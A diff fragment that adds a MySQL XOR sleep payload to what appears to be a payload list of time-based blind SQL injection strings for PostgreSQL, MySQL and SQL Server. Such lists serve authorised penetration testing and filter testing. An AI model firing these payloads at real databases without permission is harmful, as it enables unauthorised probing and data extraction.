@@ -8,6 +8,7 @@
   ```sql
   SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
   'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+  'XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
   1'=sleep(25)='1
   '%2b(select*from(select(sleep(2)))a)%2b'
   WAITFOR DELAY '0:0:25';--
